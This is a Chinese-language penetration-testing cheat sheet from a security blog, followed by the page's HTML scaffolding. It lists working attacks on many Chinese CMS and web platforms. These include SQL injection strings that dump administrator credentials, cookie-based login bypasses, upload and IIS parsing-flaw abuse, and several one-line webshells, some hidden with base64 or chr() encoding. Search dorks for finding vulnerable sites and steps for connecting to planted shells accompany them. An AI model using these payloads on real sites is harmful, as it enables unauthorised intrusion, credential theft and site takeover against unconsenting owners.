】\n%5C为十六进制的\\符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：http://www.xxx.com/rpc/show24.asp?id=127\n我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，http://www.xxx.com/rpc%5c/show24.asp?id=127\n而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。\n如果页面地址为：http://www.xx.com/rpd/#database.mdb ; 把%23替换#就可以下载了，即：http://www.xx.com/rpd/%23database.mdb\n还有利用默认的数据库路径 http://www.xxx.com/ 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）\n如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。\n这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.\n==========================================================================================================================\n【 利用sql注入点判断网站和数据库是否站库分离 】\n在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))\n注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。\n==========================================================================================================================\n【 iis6.0 PUT写入漏洞 】\n利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序\n1、IIS来宾用户对网站文件夹有写入权限\n2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾\n3、网站主目录:写入—打勾(可PUT)\n4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）\n大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。\n首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，\n接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。\n或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，\n在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。\n直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。\n==========================================================================================================================\n【 ACCESS执行SQL语句导出一句话拿webshell 】\n原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。\n点“服务器信息探测”，获得网站路径：e:\\web\\webshellcc\\的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。\ncreate table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50\ninsert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马\nselect * into [a] in ‘e:\\web\\webshellcc\\1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:\\web\\webshellcc\\的EXCEL文件\ndrop table cmd 删除建立的cmd表\n菜刀连接：http://www.xxx.com/1.asa;x.xls\n==========================================================================================================================\n【 利用过滤’or’=’or’修改代码进行绕过 】\n例如后台地址是：http://www.hdminc.net/admin/admin_index.asp\n当用万能密码登录的时候，会出现一些过滤or的提示！\n请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！\n\n\nfunction chencklogin()\n\n{\n\nif(document.login.username.value==”)\n\n{alert(‘请输入用户名’);\n\ndocument.login.username.focus();\n\nreturn false\n\n}\n\nif (document.login.password.value==”)\n\n{alert(‘请输入密码’);\n\ndocument.login.password.focus();\n\nreturn false\n\n}\n\n}\n\n\n\n注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “http://www.hdminc.net/admin/admin_index.asp”\n最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！==========================================================================================================================【 动力3.5拿shell 】inurl:printpage.asp?ArticleID=1.找到版权信息，把内容替换成：版权所有 Copyright? 2003 &lt;a href=’http://www.asp163.net’&gt;动力空间” ‘版权信息if Request(“xiaoxin”)=”520″ thendim allen,creat,text,thisline,pathif Request(“creat”)=”yes” thenSet fs = CreateObject(“Scripting.FileSystemObject”)Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))outfile.WriteLine Request(“text”)Response.write “小新恭喜”end ifResponse.write “&lt;form method=’POST’action=’”&amp;Request.ServerVariables(“URL”)&amp;”?xiaoxin=520&amp;creat=yes’&gt;”Response.write “”&amp;thisline&amp;””Response.write “&lt;input type=’text’ name=’path’ value=’”&amp;Request(“path”)&amp;”‘&gt;”Response.write “”Response.endend if%&gt;2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=5203.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。==========================================================================================================================【 aspcms】简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。爆帐号密码：admin/_content/_About/AspCms_AboutEdit.asp?id=1 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1版本不同需要更改值。第二种方法，找到后台，然后/admin/_system/AspCms_SiteSetting.asp?action=saves直接POST[php]runMode=1&amp;siteMode=1&amp;siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&amp;SwitchComments=1&amp;SwitchCommentsStatus=1&amp;switchFaq=0:Y=request(chr(35)):execute(Y)&amp;SwitchFaqStatus=0&amp;dirtyStr=&amp;waterMark=1&amp;waterMarkFont=hahahaha&amp;waterMarkLocation=1&amp;smtp_usermail=aspcmstest%40163.com&amp;smtp_user=aspcmstest&amp;smtp_password=aspcms.cn&amp;smtp_server=smtp.163.com&amp;MessageAlertsEmail=13322712%40qq.com&amp;messageReminded=1&amp;orderReminded=1&amp;applyReminded=1&amp;commentReminded=1&amp;LanguageID=1[/php]再连接配置文件config.asp 密码为#老版本中可以通过添加模板直接添加asp.但是新版已经限制了添加模板的格式为html,js,css当然如果是遇到iis6的话还是可以通过iis6的解析漏洞把文件名改成1.asp;.html这样的格式来拿到shell的.方法：点击“界面风格”，然后选“编辑模板/CSS文件”，然后“添加模板”，文件名称写error.asp;.html，文件内容写一句话&lt;%eval request(“g”)%&gt;然后添加，会提示添加成功，然后在模板列表中就可以找到我们添加的一句话了，用菜刀连接即可！可是如果遇到iis7.5呢? 以下是本人自己找到挖掘到的aspcms通杀版本的后台拿shell方法.1、进入后台，“扩展功能”–“幻灯片设置”–”幻灯样式”2、使用chorme的审查元素功能或者firefox的firebug，总之使用能修改当前页面元素的工具就好了，将对应的slidestyle的value的值修改为1%&gt;&lt;%Eval(Request (chr(65)))%&gt;&lt;%3、一句话木马，密码a。在/config/AspCms_Config.asp==========================================================================================================================【 XYCMS企业建站系统 】关键词：inurl:showkbxx.asp?id=默认数据库：data/xy#!123.mdb默认账户密码：admin admin找到网站配置，在网站名称里面直接插入一句话：网站”%&gt;&lt;%eval request(“x”)%&gt;&lt;%’，注意不要删掉网站名称！然后中国菜刀连接：/inc/config.asp【 szwyadmin漏洞绕过后台验证 】关键字:inurl:szwyadmin/login.aspjavascript:alert(document.cookie=”adminuser=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”adminpass=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”admindj=”+escape(“1″));1.后台一般存在一个szwyadmin文件夹，复制一下后台地址放在一边，之后复制代码替换后台地址访问进行注射！2.这时会弹出一个窗口，连续点击三次确定。3.重新访问后台地址，把网站后面的/login.asp 换成 admin_index.asp 奇迹般的直接进入后台了！==========================================================================================================================【 医院建站系统任意文件上传漏洞 】关键词：inurl:cms/Column.aspx?关键词：inurl:cms/Column.aspx?LMID=漏洞利用 ：xtwh/upfile.aspx直接上传aspx木马拿shell。==========================================================================================================================【 嘉友科技cms上传漏洞 】谷歌关键字：inurl:newslist.asp?NodeCode=程序采用的上传页uploadfile.asp未进行管理验证，导致建立畸形目录上传图片木马获取shell漏洞。exp：ploadfile.asp?uppath=mad.asp&amp;upname=&amp;uptext=form1.mad.asp他原上传目录是:uploadfile.asp?uppath=PicPath&amp;upname=&amp;uptext=form1.PicPath而且他的上传文件没有过滤导致未授权访问，直接上传小马，然后小马后面写为1.jpg 访问路径 查看源代码。==========================================================================================================================【 ecshopcms后台拿shell 】支持最新2.7.2版本，通杀最新版本后台低权限！&lt;?php $filen=chr(46).chr(46).chr(47).chr(110).chr(117).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112); $filec=chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(117).chr(115).chr(98).chr(93).chr(41).chr(59).chr(63).chr(62); $a=chr(119); $fp=@fopen($filen,$a); $msg=@fwrite($fp,$filec); if($msg) echo chr(79).chr(75).chr(33); @fclose($fp); ?&gt;后台-订单管理-订单打印-选择源代码编辑-保存-返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功-在根目录生成了一个null.php，一句话密码：usb==========================================================================================================================【 教育站sql注入通杀0day 】关键词：inurl:info_Print.asp?ArticleID=默认后台：www.xx.com/ad_login.asp比如：http://www.xx.com/info_Print.asp?ArticleID=539加上：union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin这样就直接得到了管理员账户和经过Md5加密的密码了。==========================================================================================================================【 IIS7.0 畸形解析漏洞通杀oday 】找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP一句话图片木马缀改成.jpg，传上去，得到图片地址。在图片格式后面添加xx.php xx随便你怎么填，只要后缀为.php就好，之后菜刀连接即可！==========================================================================================================================【 Yothcms 遍历目录漏洞 】优斯科技企业网站管理系统(YothCMS)是一款完全开源免费的CMS。默认后台：admin/login.asp遍历目录：ewebeditor/manage/upload.asp?id=1&amp;dir=../数据库路径：%23da%23ta%23\\%23db_%23data%23%23.asa==========================================================================================================================【 传信网络独立开发网站源码0day漏洞 】默认后台：system/login.asp编辑器后台路径：ubbcode/admin_login.asp数据库路径：ubbcode/db/ewebeditor.mdb默认账号密码：yzm 111111==========================================================================================================================【 科讯cms 6.5后台拿shell 】1.可以在数据库备份中找到网站的绝对路径2.利用科讯SQL注入漏洞利用工具也能找到进入后台后执行sql命令：create table E:\\wenxiushi\\wz001\\KS_Data\\Collect\\KS_Collect.Mdb.cmd (a varchar(50))insert into E:\\wenxiushi\\wz001\\KS_Data\\Collect\\KS_Collect.Mdb.cmd (a) values (‘┼攠數畣整爠煥敵瑳∨∣┩愾’)接着数据库备份成1.asp 菜刀连接密码：#==========================================================================================================================【 动易2006后台拿shell 】进入后台后，我们在左边菜单栏中选择“系统设置”，然后在出现的菜单栏里选择“自定义页面管理”，接着需要先添加一个自定义页面分类，选择“添加自定义分类”这个选项，分类名称与分类简介都可以随便填写。填写完毕后选择“添加”，系统提示添加成功。下面再来选择“添加自定义页面”，“页面名称”随便输入，“所属分类”就是刚才建立的分类就可以了。“页面类型”和“页面路径”都不用管，保持默认.不过如果没有改页面路径的话，默认生成的文件是在根目录下的，也就是http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。“页面简介”也不用管，下面就是页面内容了。这里填入小马的代码。一切完毕点击“添加”会提示保存自定义页面成功。最后一步是要生成我们的木马页面。选择“自定义页面管理首页”，点击右边出现的“生成本页”就OK 了，成功获得动易的shell。==========================================================================================================================【 Shopex4.8.5 注入漏洞后台拿shell 】关键词：powered by shopex v4.8.5exp:Shopex 4.8.5 SQL Injection ExpShopex 4.8.5 SQL Injection Exp (product-gnotify)&lt;form action=”http://www.lpboke.com/?product-gnotify” method=”post” name=”submit_url”&gt;\n\nfuck\n\n\n\n保存为html格式，替换代码中的网站，本地打开后点击小图标，出现新页面，帐号密码爆出来了，默认后台：shopadmin\n拿shell方法….\n第一步 页面管理 修改模版 然后选一个XML编辑\n开始用 live http 抓包 你们懂的 然后把第一个POST包给抓出来\n然后改包 id=1273923028-info.xml&amp;tmpid=1273923028&amp;name=index_temp.php&amp;file_source=\n解释一下 id是你选择的模版文件夹名称 后面的info.xml 是你修改的XML文件 tmpid= 你们懂的 就是模版文件夹 然后 name 是你提交的文件名字 file_source 是后门或者shel\n我这里是一句话 你们懂的 然后提交了之后 地址是这样的http://Madman.in/themes/文件名称/你的木马名称—————————————————————————————————————————————————————-\n【 ecshop漏洞总汇 】\n关键字：powered by ecshop普通代码：user.php?act=order_query&amp;order_sn=’ union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*\n变种代码：search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319直接在网站后台加入代码回车就能爆出帐号密码，再去掉代码加上/admin回车就能直接进后台了。拿shell方法很简单，找到“库项目管理”再选择“配送的方式”，在代码最下面插入php一句话木马：&lt;?php eval($_POST[x]);?&gt; 不行就换php木马的预代码！\n接着保存，一句话路径是：http://www.xxx.org/myship.php ; 打开“ASP+PHP两用Shell.html”填入地址，点击一下环境变量，成功之后点击上传文件就可以拿shell了。—————————————————————————————————————————————————————-【 帝国cms 6.6最新版本 】\n自定义页面-增加自定义页面-随便写个.php文件名，内容写：echo base64_decode(“PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=”);\n如果内容直接添一句话或者php大马是无用的，因为他会生成xxx.php前先给你执行，\nPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 就是 &lt;?php @eval($_POST[‘cmd’]);?&gt; 的base64加密。\n所以生成xxx.php后 会出现内容 &lt;?php @eval($_POST[‘cmd’]);?&gt; 在文件里，然后用菜刀直接连接吧。\n—————————————————————————————————————————————————————-\n【 phpweb 】\n关键字：inurl:down/class/index.php?myord=\n后台地址：admin.php\n万能密码：admin ‘or ‘1’=’1\n注入地址：down/class/index.php?myord=1\n表段：pwn_base_admin\n拿shell通杀漏洞：登入后台–文章–文章发布–文章内容里的图片上传按钮–抓包之后改包NC提交。\n也可以用下面的exp拿shell：\n用火狐浏览器登录后台，因为火狐浏览器有保留cookies的功能， 找到“phpweb之exp”这个html，拉进火狐浏览器器里上传1.php;.jpg的一句话木马，查看源码菜刀连接！\n—————————————————————————————————————————————————————-\n动科(dkcms)漏洞:\n官方网站：www.dkcms.com主要是差不多3个版本为主吧，\nV2.0 data/dkcm_ssdfhwejkfs.mdbV3.1 _data/___dkcms_30_free.mdbV4.2 _data/I^(()UU()H.mdb默认后台：admin编辑器：admin/fckeditor后台拿shell，fck编辑器突破可拿shell建立asp文件夹Fck的路径：Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/mk.asp&amp;NewFolderName=mk.asp\n—————————————————————————————————————————————————————-\nESPCMS通杀0day :\n关键字：inurl:index.php?ac=article&amp;at=read&amp;did=\n默认后台：adminsoft/index.php siteadmin/index.php\n注入点(爆表前缀)：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)%23\n爆帐号：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)%23\n爆密码：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)%23\n帐号和密码一次性爆：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(),concat((select (select concat(0x7e,0x27,username,0x27,password)) from 前缀_admin_member limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)%23\n进到后台后，直接点击分类图片-修改-选择文件-直接上传php一句话木马\nPS：当上传不了php木马时，去系统设置一下，添加图片上传格式 |php ，这样就可以上传一个图片文件头的php木马。\n—————————————————————————————————————————————————————-\nThinkphp框架任意代码执行漏洞 :\nThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架\n关键字：thinkphp intitle:系统发生错误\n获取Thinkphp的版本号：index.php/module/action/param1/$%7B@print(THINK_VERSION)%7D\n获取服务器的配置信息：index.php/module/aciton/param1/${@phpinfo()}\n列出网站所有文件列表：index.php/module/action/param1/{${system($_GET[‘x’])}}?x=ls -al\n直接在网页执行一句话：index.php/module/action/param1/{${eval($_POST[s])}}\n菜刀连接：http://www.xxx.com/index.php/module/action/param1/{${eval($_POST[s])}} 密码：s\n—————————————————————————————————————————————————————-\n良精系统 :\n( 爆管理员帐号密码的代码 )\nNewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20”=’\n（ 一句话木马的妙用 ）\n插入一句话木马后，连接网站的配置文件：inc/config.asp 密码都是g\n1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可\n2.网站配置-网站地址-插入闭合的一句话木马：http://”%&gt;&lt;%execute(request(“g”))%&gt;&lt;%’\n3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=”\n4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’\n（ 利用upfile_other.asp漏洞拿shell ）\n直接访问会员中心：userreg.asp\n注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer\n &lt;META http-equiv=Content-Type content=”text/html; charset=gb2312″&gt; &lt;STYLE type=text/css&gt;BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px }   &lt;FORM name=form1 action=”http://www.xxx.com/upfile_other.asp”; method=post encType=multipart/form-data&gt;    \n\n另外可以利用会员中心的cookies，用火狐浏览器登陆之后，访问upfile_other.asp页面，用抓包工具去抓包，接着用明小子上传拿shell.\n（ 上传漏洞 ）\n漏洞文件：Upfile_Photo.asp\n前提是进入后台了，访问这个文件，将提示“请先选择你要上传的文件！”，用抓包工具抓管理员的cookies，再把上传地址跟cookies扔到名小子里上传拿shell\n（ 南方在线编辑器 ）\n默认后台：admin/Southidceditor/admin_style.asp\n数据库路径：admin/SouthidcEditor\\Datas\\SouthidcEditor.mdb\n遍历目录：admin/Southidceditor/admin_uploadfile.asp?id=14&amp;dir=../..\n文件上传页面：admin/Southidceditor/ewebeditor.asp?id=57&amp;style=southidc\n样式设置页面：admin/SouthidcEditor/Admin_Style.asp?action=styleset&amp;id=47\n—————————————————————————————————————————————————————-\ndedecms最新注入漏洞及找后台技巧 :\n访问这个：plus/search.php?keyword=as&amp;typeArr[ uNion ]=a\n看结果如果提示：Safe Alert: Request Error step 1 !那么直接用下面的exp爆出所有管理员的帐号密码：\nplus/search.php?keyword=as&amp;typeArr[111%3D@\\’)+and+(SELECT+1+FROM+(select+count(),concat(floor(rand(0)2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%23@__admin+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@\\’+]=a\n看结果如果提示：Safe Alert: Request Error step 2 !\n那么直接用下面的exp爆出所有管理员的帐号密码\nplus/search.php?keyword=as&amp;typeArr[111%3D@\\’)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%23@__admin%23@\\’+]=a\n有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了\n破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可\n如何找后台？\n默认后台：dede\n第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）\n第二种方法：把域名作为后台去尝试\n第三种方法：查看这个文件：robots.txt\n第四种方法：ping下域名获得ip之后，http://www.bing.com/ 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）\n—————————————————————————————————————————————————————-\nPHPcms V9 爆数据库信息漏洞:\n直接爆出数据库连接信息：/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php\n关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码\n&lt;?$fp = @fopen(“0day.php”, ‘a’);\n@fwrite($fp, ‘&lt;‘.’?php’.”\\r\\n\\r\\n”.’eval($_POST[0day])’.”\\r\\n\\r\\n?”.”&gt;\\r\\n”);点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day\n","dateCreated":"2017-03-01T16:49:11+08:00","dateModified":"2017-03-01T16:51:11+08:00","datePublished":"2017-03-01T16:49:11+08:00","description":"渗透笔记【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：DeDeCms（织梦）ECMS（帝国）PHPCMSPHP168HBcms（宏博）SupeSiteCMSware(思维)Joomla![BBS]Discuz![BBS]phpWind[SNS]UCenterHome[SNS]ThinkSNS[商城]EcShop[商城]ShopEx[博客]WordPress[维基]HDWiki[微博]PHPsay[DIGG]PBdigg—————————————————————————————–","headline":"渗透笔记","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://s-sec.github.io/2017/03/01/渗透笔记/"},"publisher":{"@type":"Organization","name":"Lao k17","sameAs":["https://paper.seebug.org/","https://js.tuisec.win/convert/ox2str/","https://www.cvedetails.com/","http://www.expku.com/","https://wy.tuisec.win/","https://s.threatbook.cn/"],"image":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/11cf39ebba4716a5945df93991af2a69"}},"url":"http://s-sec.github.io/2017/03/01/渗透笔记/","keywords":"渗透"}</script>
+    <meta name="description" content="渗透笔记【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：DeDeCms（织梦）ECMS（帝国）PHPCMS">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="渗透笔记">
+<meta property="og:url" content="http://s-sec.github.io/2017/03/01/渗透笔记/index.html">
+<meta property="og:site_name" content="攻VS防，战略与战术！马拉松式工作！">
+<meta property="og:description" content="渗透笔记【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：DeDeCms（织梦）ECMS（帝国）PHPCMS">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-03-01T08:51:11.428Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透笔记">
+<meta name="twitter:description" content="渗透笔记【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：DeDeCms（织梦）ECMS（帝国）PHPCMS">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-3frockyt2j28isvdztjchy5nhkz8tjki9ermufc1ckptmvjdftux94m2ahub.min.css">
+    <!--STYLES END-->
+    
+
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a class="header-title-link" href="/ ">攻VS防，战略与战术！马拉松式工作！</a>
+    </div>
+    
+        
+            <a  class="header-right-picture "
+                href="#about">
+        
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="about"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">about</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://paper.seebug.org/" target="_blank" rel="noopener" title="seebug paper">
+                    
+                        <i class="sidebar-button-icon fab fa-seebug" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">seebug paper</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://js.tuisec.win/convert/ox2str/" target="_blank" rel="noopener" title="decode tools">
+                    
+                        <i class="sidebar-button-icon fab fa-decode" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">decode tools</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://www.cvedetails.com/" target="_blank" rel="noopener" title="cvedetails">
+                    
+                        <i class="sidebar-button-icon fab fa-cvedetails" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">cvedetails</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://www.expku.com/" target="_blank" rel="noopener" title="exp库">
+                    
+                        <i class="sidebar-button-icon fab fa-edb" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">exp库</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://wy.tuisec.win/" target="_blank" rel="noopener" title="乌云历史库">
+                    
+                        <i class="sidebar-button-icon fab fa-wy" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">乌云历史库</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://s.threatbook.cn/" target="_blank" rel="noopener" title="微步沙箱">
+                    
+                        <i class="sidebar-button-icon fab fa-sandboxie" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">微步沙箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
